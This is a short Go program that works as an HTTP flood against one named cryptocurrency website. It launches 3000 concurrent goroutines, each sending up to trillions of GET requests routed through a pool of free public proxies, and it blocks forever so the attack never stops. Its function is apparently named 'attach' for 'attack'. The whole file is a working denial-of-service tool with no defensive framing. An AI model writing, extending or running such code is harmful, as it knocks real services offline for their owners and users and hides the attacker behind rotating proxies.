package main

import (
	"fmt"
	"sync"


	proxy "github.com/myself659/xiciproxy"
)

var url = "https://atmchain.io/zh.html"

var dx *proxy.ProxyPool

func attach() {
	for i := 0; i < 2000000000000; i++ {
		resp, err := dx.Get(url)
		if err != nil {
			fmt.Println(err, resp)
		}
	}
}

func main() {
	fmt.Println("start")
	dx = proxy.NewProxyPool()

	for i := 0; i < 3000; i++ {
		go attach()
		
	}

	var wg sync.WaitGroup
	wg.Add(1)
	wg.Wait()
}
